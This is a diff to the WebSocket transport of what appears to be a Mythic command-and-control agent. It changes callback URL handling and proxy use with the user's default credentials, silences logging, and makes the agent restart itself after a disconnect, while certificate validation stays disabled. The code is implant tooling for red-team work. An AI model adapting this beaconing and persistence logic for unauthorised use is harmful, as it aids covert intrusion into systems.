@@ -54,7 +54,33 @@ namespace WebsocketTransport
 #else
         private bool Debug = false;
 #endif
-
+        private string ParseURLAndPort(string host, int port)
+        {
+            string final_url = "";
+            int last_slash = -1;
+            if (port == 443 && host.StartsWith("wss://"))
+            {
+                final_url = host;
+            }
+            else if (port == 80 && host.StartsWith("ws://"))
+            {
+                final_url = host;
+            }
+            else
+            {
+                last_slash = host.Substring(8).IndexOf("/");
+                if (last_slash == -1)
+                {
+                    final_url = string.Format("{0}:{1}", host, port);
+                }
+                else
+                {
+                    last_slash += 8;
+                    final_url = host.Substring(0, last_slash) + $":{port}" + host.Substring(last_slash);
+                }
+            }
+            return final_url;
+        }
         public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
             DebugPrint("Initialize agent...");
@@ -74,7 +100,7 @@ namespace WebsocketTransport
             {
                 PostUri = $"/{PostUri}";
             }
-            Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
+            Endpoint = this.ParseURLAndPort(CallbackHost, CallbackPort);
             KillDate = data["killdate"];
 
             string[] reservedStrings = new[]
@@ -96,7 +122,6 @@ namespace WebsocketTransport
                     _additionalHeaders.Add(k, data[k]);
                 }
             }
-
             // Disable certificate validation on web requests
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
@@ -111,7 +136,6 @@ namespace WebsocketTransport
                     {
                         if (Client.IsAlive)
                         {
-                            DebugPrint("Sending message");
                             Client.Send(result);
                         }
                     }
@@ -308,10 +332,9 @@ namespace WebsocketTransport
             receiverQueue = new ConcurrentQueue<IMythicMessage>();
             receiverEvent = new AutoResetEvent(false);
             senderEvent = new AutoResetEvent(false);
-
             Client = new WebSocket(Endpoint + PostUri);
+            Client.Log.Level = LogLevel.Error;
             Client.WaitTime = TimeSpan.FromHours(8);
-
 
             List<KeyValuePair<string,string>> headers = new List<KeyValuePair<string, string>>();
             if (TaskingType == "Push")
@@ -331,22 +354,27 @@ namespace WebsocketTransport
             Client.CustomHeaders = headers;
 
             IWebProxy proxy = WebRequest.GetSystemWebProxy();
-
-            if (!proxy.IsBypassed(new Uri(Endpoint))) 
+            NetworkCredential credential = proxy.Credentials as NetworkCredential;
+            var proxyURL = proxy.GetProxy(new Uri(Endpoint + PostUri)).AbsoluteUri;
+            if(proxyURL != Endpoint + PostUri)
             {
-                NetworkCredential credential = CredentialCache.DefaultCredentials as NetworkCredential;
-                Client.SetProxy(proxy.GetProxy(new Uri(Endpoint)).AbsoluteUri, credential.UserName, credential.Password);
+                if (credential != null)
+                {
+                    Client.SetProxy(proxy.GetProxy(new Uri(Endpoint + PostUri)).AbsoluteUri, credential.UserName, credential.Password);
+                }
+                else
+                {
+                    Client.SetProxy(proxy.GetProxy(new Uri(Endpoint + PostUri)).AbsoluteUri, "", "");
+                }
             }
-            
-            //enable TLS 1.2 for networks that enforce 1.2 and wont accept 1.1
-            Client.SslConfiguration.EnabledSslProtocols = System.Security.Authentication.SslProtocols.Tls12;
+
+
             Client.OnOpen += OnAsyncConnect;
             Client.OnMessage += OnAsyncMessageReceived;
             Client.OnError += OnAsyncError;
             Client.OnClose += OnAsyncDisconnect;
 
             Client.Connect();
-
             if (Client.IsAlive)
             {
                 if (EncryptedExchangeCheck && !_uuidNegotiated)
@@ -404,14 +432,13 @@ namespace WebsocketTransport
 
         private bool AddToSenderQueue(IMythicMessage msg)
         {
-            DebugPrint("Adding message to send queue.");
             WebSocketMessage m = new WebSocketMessage()
             {
                 client = true,
                 data = "",
                 tag = String.Empty
             };
-            
+
             m.data = Serializer.Serialize(msg);
             string message = jsonSerializer.Serialize(m);
             senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));
@@ -422,7 +449,6 @@ namespace WebsocketTransport
 
         private void OnAsyncError(object sender, ErrorEventArgs e)
         {
-            DebugPrint("On error.");
             if (Client.IsAlive)
             {
                 Client.Close();
@@ -432,17 +458,16 @@ namespace WebsocketTransport
 
         private void OnAsyncDisconnect(object sender, CloseEventArgs args)
         {
-            DebugPrint("Disconnected.");
             if (Client.IsAlive)
             {
                 Client.Close();
             }
-            cancellationTokenSource.Cancel();
+            //cancellationTokenSource.Cancel();
+            (new ST.Task(Start)).Start();
         }
 
         private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
         {
-            DebugPrint("Message received.");
             WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
             if (EncryptedExchangeCheck)
             {
